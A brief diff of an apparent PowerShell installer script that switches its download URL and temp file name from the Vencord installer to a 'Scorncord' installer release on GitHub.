@@ -1,6 +1,6 @@
-$link = "https://github.com/Vencord/Installer/releases/latest/download/VencordInstallerCli.exe"
+$link = "https://github.com/Scorncord/Installer/releases/latest/download/ScorncordInstallerCli.exe"
 
-$outfile = "$env:TEMP\VencordInstallerCli.exe"
+$outfile = "$env:TEMP\ScorncordInstallerCli.exe"
 
 Write-Output "Downloading installer to $outfile"
 
